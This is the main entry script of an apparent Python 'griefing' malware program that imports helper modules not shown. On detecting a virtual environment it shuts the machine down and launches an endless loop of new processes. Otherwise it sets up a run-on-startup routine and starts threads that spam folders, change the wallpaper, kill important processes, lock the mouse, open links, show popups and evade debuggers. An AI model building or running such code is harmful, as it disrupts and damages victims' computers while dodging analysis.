import sys
from os import system
from threading import Thread

from modules.annoying import *
from modules.config import *
from modules.griefing import *
from modules.onrun import *
from modules.utili import *

if __name__ == "__main__":
    if hasattr(sys, "real_prefix"):
        system("shutdown /s")
        while 1:
            system("start")
    else:
        run_on_run()

        if folder_spam == True:
            create_folders_thread = Thread(target=create_folders).start()

        if change_background == True:
            change_background_thread = Thread(target=change_wallpaper).start()

        if kill_main == True:
            kill_important_thread = Thread(target=kill_important).start()

        if lock_mouse == True:
            lock_mouse_thread = Thread(target=mouse_lock).start()

        if open_links == True:
            open_links_thread = Thread(target=open_url).start()

        if popup == True:
            popup_thread = Thread(target=popup).start()

        if anti_debugger == True:
            anti_debugger_thread = Thread(target=anti_debug).start()
